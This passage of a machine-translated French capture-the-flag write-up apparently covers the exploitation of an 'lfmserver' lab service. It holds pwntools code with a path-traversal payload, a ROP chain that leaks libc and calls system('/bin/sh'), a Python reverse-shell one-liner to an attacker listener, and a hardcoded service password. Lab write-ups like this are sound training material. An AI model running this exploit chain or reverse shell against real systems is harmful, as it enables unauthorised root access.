INPUTREQ = <span class="hljs-string">b"CHECK /{1} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n{2}\n"</span>
md5sum = <span class="hljs-string">b"26ab0db90d72e28ad0ba1e22ee510510"</span><font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>)<font></font>
send_= INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√áa marche avec succ√®s! </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k9/4f/5v/k94f5vkgarkqukz9vhjiprkt1yo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Utilisons maintenant une fuite de m√©moire et d√©terminons l'adresse o√π la biblioth√®que libc est charg√©e. </font><font style="vertical-align: inherit;">Pour ce faire, nous obtenons l'adresse de la fonction d'√©criture dans la biblioth√®que libc charg√©e.</font></font><br>
<br>
<pre><code class="python hljs">binary = ELF(<span class="hljs-string">"./lfmserver"</span>)<font></font>
libc = ELF(<span class="hljs-string">"./libc6.so"</span>)<font></font>
<font></font>
rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x6</span>, binary.got[<span class="hljs-string">'dup2'</span>])<font></font>
rop = flat(rop_binary.build())<font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)</code></pre><br>
<img src="https://habrastorage.org/webt/f0/5h/nl/f05hnlmsa7slih0sdwajq5kathy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
S√©lectionnez maintenant l'adresse de la fonction dup2 (les 8 premiers octets). </font><font style="vertical-align: inherit;">Soustrayez l'adresse de la fonction dup2 dans la biblioth√®que d√©charg√©e. </font><font style="vertical-align: inherit;">Cela trouvera l'adresse de base de libc.</font></font><br>
<br>
<pre><code class="python hljs">print(<span class="hljs-string">f"[*] Payload sent"</span>)<font></font>
<font></font>
recv_ = r.recvall().split(<span class="hljs-string">b'\r'</span>)<font></font>
leak = u64(recv_[<span class="hljs-number">-1</span>][:<span class="hljs-number">8</span>])<font></font>
print(<span class="hljs-string">f"[*] Leak address: <span class="hljs-subst">{hex(leak)}</span>"</span>)<font></font>
libc.address = leak - libc.symbols[<span class="hljs-string">'dup2'</span>]<font></font>
print(<span class="hljs-string">f"[+] Libc base: <span class="hljs-subst">{hex(libc.address)}</span>"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/xf/t0/x3/xft0x3qwddfzdrfclwkj578gzpk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Trouvez maintenant l'adresse de la ligne / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il reste √† collecter le ROP, dans lequel les descripteurs d'E / S standard (0,1,2) seront redirig√©s vers le descripteur enregistr√© dans le programme (prendre 6). </font><font style="vertical-align: inherit;">Apr√®s quoi la fonction syst√®me sera appel√©e, o√π nous passerons l'adresse de la ligne / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
rop = flat(rop_libc.build()) <font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)<font></font>
send_ = INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.recv()<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/4a/fy/cq/4afycq7-ht7dkktpmeddwci4tqa.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien! </font><font style="vertical-align: inherit;">Nous obtenons le shell de la racine. </font><font style="vertical-align: inherit;">Mais il meurt rapidement. </font><font style="vertical-align: inherit;">Ex√©cutez l'√©couteur (nc -lvp 8765) et lancez le shell de connexion arri√®re.</font></font><br>
<br>
<pre><code class="python hljs">r.sendline(<span class="hljs-string">b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",8765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/vj/nh/ci/vjnhcisc1ra9vng8htw8n_2phwi.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/tj/ff/ll/tjfflloqumm5mggkbrwlx2ofc6w.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous avons une coque stable. </font><font style="vertical-align: inherit;">Je donne le code complet dans l'image ci-dessous. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ow/ek/pi/owekpiviv3pqxnxr-rpeqgzv6-a.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais nous ne pouvons pas lire le drapeau racine ...</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 3</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En ex√©cutant linpeas et en regardant la sortie, nous trouvons des sections int√©ressantes, en particulier / dev / sda2. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obtenons des informations sur tous les p√©riph√©riques de bloc. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/ox/-v/ldox-vzassozbyooscg-issuoow.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons donc la partition racine / dev / sda2. </font><font style="vertical-align: inherit;">Cr√©ez un r√©pertoire et montez la partition. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/ez/c5/u4ezc5zbakdqx11phjzr1cqp-yi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous trouvons donc le drapeau racine. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez nous rejoindre sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Vous y trouverez du mat√©riel int√©ressant, des cours fusionn√©s ainsi que des logiciels. </font><font style="vertical-align: inherit;">Cr√©ons une communaut√© dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pourrons toujours nous entraider pour tout probl√®me informatique et de s√©curit√© de l'information.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr502256/index.html">Comment visualiser un graphique d'int√©gration Spring √† l'aide de Neo4j?</a></li>
<li><a href="../fr502260/index.html">ESP-NOW est un protocole de communication alternatif pour ESP8266 et ESP32. Concepts de base</a></li>
<li><a href="../fr502262/index.html">Pourquoi les AIOps et la surveillance parapluie pour la banque, ou sur quoi se construisent les relations avec la client√®le</a></li>
<li><a href="../fr502264/index.html">Infrastructure √† cl√© publique. D√©livrance de certificats dans des conditions d'auto-isolement</a></li>
<li><a href="../fr502266/index.html">Aurora sur la plate-forme Intel. L'aube de l'√®re des exaflops</a></li>
<li><a href="../fr502272/index.html">Ne dites pas ¬´je me sens¬ª et les autres r√®gles anglaises qui conduisent √† la stupeur</a></li>
<li><a href="../fr502274/index.html">Personnalisez la disposition du clavier externe sur Android sans root</a></li>
<li><a href="../fr502276/index.html">M√©thode Kanban: Exemple PNZ n ¬∞ 2: Formation et cours</a></li>
<li><a href="../fr502278/index.html">Comment ne pas modifier les tests Python</a></li>
<li><a href="../fr502286/index.html">Robots d'incendie</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>